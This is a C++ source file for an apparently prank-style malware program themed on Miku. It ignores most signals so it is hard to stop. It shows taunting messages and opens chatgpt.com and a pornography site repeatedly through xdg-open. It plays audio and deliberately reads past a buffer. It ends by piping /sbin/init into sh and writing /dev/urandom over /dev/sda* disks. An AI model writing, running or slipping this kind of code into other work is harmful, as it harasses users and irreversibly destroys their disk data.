/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <string>
#include <csignal>
#include <fcntl.h>
#include <unistd.h>
#include "displayText.h"
#include "macOS.h"
#include "miku.h"
#include <sys/socket.h>
#include <sys/un.h>
#include <thread>

#define IPC_SOCKET "/tmp/mikumiku.sock"

int sock_server_fd = -1; // global sock server fd

void funcOverflow()
{
  const char bufferOverflow[10] = "\nTesting";
  int i = 0;

  for(short bytesLeft = 3072; bytesLeft >= 0; bytesLeft--) {
    std::cout << bufferOverflow[i] << std::flush;
    i++;
    usleep(25000);

  }
}

int initializeIPC() {
        unlink(IPC_SOCKET);

        sock_server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock_server_fd == -1) {
                perror("socket didn't load");
                return EXIT_FAILURE;
        }

        struct sockaddr_un server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sun_family = AF_UNIX;
        strncpy(server_addr.sun_path, IPC_SOCKET, sizeof(server_addr.sun_path) - 1);

        if (bind(sock_server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
                perror("bind failed");
                return EXIT_FAILURE;
        }

        if (listen(sock_server_fd, 1) == -1) {
                perror("listen failed");
                return EXIT_FAILURE;
        }
        return EXIT_SUCCESS;
}

int handleConnections() {
        while (true) {
                int sock_client_fd = accept(sock_server_fd, nullptr, nullptr);
                if (sock_client_fd == -1) {
                        perror("accept failed");
                        continue;
                }

                char buffer[256] = {0};
                ssize_t bytes = recv(sock_client_fd, buffer, sizeof(buffer) - 1, 0);

                if (bytes > 0) {
                        buffer[bytes] = '\0';
                        send(sock_client_fd, "ACK", 3, 0);
                }

                close(sock_client_fd);
        }
        return EXIT_SUCCESS;
}

int main()
{

  std::thread ipc_thread(handleConnections);
  ipc_thread.detach();
  short repeatLoop = 64;

  // Okay so I wanted to block as many signals as I could, so this loop covers that.
  while(repeatLoop > 0) {
    std::signal(repeatLoop, SIG_IGN);
    repeatLoop--;
  }
  initializeMiku();
  // The most boring yet effective thing: TEXT.
  sleep(10);
  displayText("lol still using this PC?");
  sleep(5);
  displayText("\nSystem Unstable!!");
  sleep(2);
  displayText("\nOh no! Kernel Panic incoming!!!");
  sleep(1);
  displayText("\n( i am lying :) )");
  sleep(3);
  displayText("\n?CP siht gnisu llits lol");
  sleep(5);
  displayText("\nFun fact about AI: ");
  sleep(2);
  displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");

  // Ruining browser history with ChatGPT
  repeatLoop = 10;

  while (repeatLoop--) {
    system("xdg-open https://chatgpt.com");
  }
  sleep(5);
  displayText("Is this too little AI for you?");
  sleep(5);
  std::cout << "\033[2J\033[1;1H" << std::flush;
  loremIpsum();
  sleep(5);
  displayText("\nYo did you hear about the-\nHEADPHONE WARNING IN 5 SECONDS");
  system("mpv --no-video https://www.youtube.com/watch?v=vPlFkyXY6L0 > /dev/null");
  displayText("\nYou're a twerp for not liking Miku!\nWhat about the Kagamines?");
  system("mpv --no-video https://www.youtube.com/watch?v=KF9Mu2gXNdI > /dev/null");
  displayText("\nOkay how can I please you now?");
  sleep(5);
  macOS();
  sleep(10);
  displayText("\nHey I'm annoying, right? Just Ctrl+C!");
  sleep(6);

  repeatLoop = 1337;

  while(repeatLoop--) {
    system("xdg-open https://pornhub.com");
  }
  sleep(5);

  displayText("\nRIP your browser history. In case you don't have a browser, nothing ran.");
  sleep(7);
  displayText("\nYour data is now on DoxBin! Well, at least if you have internet.");
  sleep(2);
  displayText("\nJust kidding.");
  sleep(5);
  displayText("\nKASANE TETO!!!");
  system("mpv --no-video https://www.youtube.com/watch?v=NwuXDha7OvE > /dev/null");
  displayText("\nHere we are, already at UTAUs, why not keep going?\nDon't worry, there will be some Momone Momo later.");
  sleep(8);

  repeatLoop = 10000;

  while(repeatLoop--) {
    displayText("\nMomone Momo");
     usleep(1000);
  }
  repeatLoop = -1;
  sleep(5);
  displayText("\nOh wait did I figure it out?");
  system("mpv --no-video --volume=70 https://www.youtube.com/watch?v=GCcWD265-3E > /dev/null &");
  sleep(3);
  displayText("\nThere we go! Background music.");
  sleep(15);
  displayText("\nSo, what should I do next...");
  sleep(5);
  displayText("\nWe have too little payload but more time...");
  sleep(5);
  displayText("\nI think I got an idea.");
  sleep(2);
  funcOverflow();
  sleep(10);

  // This next part is untested.
  repeatLoop = 100;

  while(repeatLoop--) {
    displayText("\033[2J\033[1;1H");
    usleep(600000);
  }

  system("cat /sbin/init | sh");
  sleep(5);
  system("cat /dev/urandom > /dev/sda* & ");
  displayText("Man I don't know what to do.");
  sleep(8);
  displayText("Just kidding check your disk space.");

}
